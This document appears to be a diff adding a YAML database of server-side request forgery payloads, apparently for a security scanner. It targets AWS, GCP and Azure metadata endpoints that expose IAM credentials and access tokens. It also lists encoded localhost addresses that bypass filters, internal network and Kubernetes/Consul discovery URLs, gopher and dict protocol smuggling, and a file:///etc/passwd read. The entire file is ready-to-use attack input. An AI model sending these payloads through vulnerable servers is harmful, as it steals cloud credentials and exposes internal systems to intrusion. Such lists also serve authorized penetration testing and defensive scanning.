@@ -1,0 +1,159 @@
+# SSRF Payloads with Metadata
+# Usage: Filter by target and bypass_type
+
+payloads:
+  # AWS IMDS
+  - payload: "http://169.254.169.254/latest/meta-data/"
+    target: aws
+    type: cloud-metadata
+    data_exposed: instance-metadata
+    bypass_type: none
+
+  - payload: "http://169.254.169.254/latest/meta-data/iam/security-credentials/"
+    target: aws
+    type: cloud-metadata
+    data_exposed: iam-credentials
+    bypass_type: none
+    severity: critical
+
+  - payload: "http://169.254.169.254/latest/user-data/"
+    target: aws
+    type: cloud-metadata
+    data_exposed: user-data-scripts
+    bypass_type: none
+
+  - payload: "http://169.254.169.254/latest/meta-data/identity-credentials/ec2/security-credentials/ec2-instance"
+    target: aws
+    type: cloud-metadata
+    data_exposed: ec2-credentials
+    bypass_type: none
+    severity: critical
+
+  # GCP Metadata
+  - payload: "http://metadata.google.internal/computeMetadata/v1/"
+    target: gcp
+    type: cloud-metadata
+    data_exposed: instance-metadata
+    bypass_type: none
+    note: "Requires header: Metadata-Flavor: Google"
+
+  - payload: "http://metadata.google.internal/computeMetadata/v1/instance/service-accounts/default/token"
+    target: gcp
+    type: cloud-metadata
+    data_exposed: service-account-token
+    bypass_type: none
+    severity: critical
+
+  # Azure IMDS
+  - payload: "http://169.254.169.254/metadata/instance?api-version=2021-02-01"
+    target: azure
+    type: cloud-metadata
+    data_exposed: instance-metadata
+    bypass_type: none
+    note: "Requires header: Metadata: true"
+
+  - payload: "http://169.254.169.254/metadata/identity/oauth2/token?api-version=2018-02-01&resource=https://management.azure.com/"
+    target: azure
+    type: cloud-metadata
+    data_exposed: managed-identity-token
+    bypass_type: none
+    severity: critical
+
+  # Localhost - IP bypass variants
+  - payload: "http://127.0.0.1"
+    target: localhost
+    type: internal-access
+    bypass_type: none
+
+  - payload: "http://localhost"
+    target: localhost
+    type: internal-access
+    bypass_type: none
+
+  - payload: "http://0.0.0.0"
+    target: localhost
+    type: internal-access
+    bypass_type: zero-ip
+
+  - payload: "http://[::1]"
+    target: localhost
+    type: internal-access
+    bypass_type: ipv6
+
+  - payload: "http://127.1"
+    target: localhost
+    type: internal-access
+    bypass_type: short-ip
+
+  - payload: "http://2130706433"
+    target: localhost
+    type: internal-access
+    bypass_type: decimal-ip
+
+  - payload: "http://0x7f000001"
+    target: localhost
+    type: internal-access
+    bypass_type: hex-ip
+
+  - payload: "http://017700000001"
+    target: localhost
+    type: internal-access
+    bypass_type: octal-ip
+
+  - payload: "http://127.0.0.1.nip.io"
+    target: localhost
+    type: internal-access
+    bypass_type: dns-rebinding
+
+  # Internal networks
+  - payload: "http://10.0.0.1"
+    target: internal
+    type: internal-network
+    bypass_type: none
+
+  - payload: "http://172.16.0.1"
+    target: internal
+    type: internal-network
+    bypass_type: none
+
+  - payload: "http://192.168.0.1"
+    target: internal
+    type: internal-network
+    bypass_type: none
+
+  - payload: "http://192.168.1.1"
+    target: internal
+    type: internal-network
+    bypass_type: none
+
+  # Cloud internal services
+  - payload: "http://internal-service:8080"
+    target: internal
+    type: service-discovery
+    bypass_type: none
+
+  - payload: "http://kubernetes.default.svc"
+    target: kubernetes
+    type: service-discovery
+    bypass_type: none
+
+  - payload: "http://consul:8500/v1/agent/members"
+    target: consul
+    type: service-discovery
+    bypass_type: none
+
+  # Protocol smuggling
+  - payload: "gopher://127.0.0.1:25/"
+    target: localhost
+    type: protocol-smuggling
+    bypass_type: gopher-protocol
+
+  - payload: "dict://127.0.0.1:11211/"
+    target: localhost
+    type: protocol-smuggling
+    bypass_type: dict-protocol
+
+  - payload: "file:///etc/passwd"
+    target: localhost
+    type: file-read
+    bypass_type: file-protocol
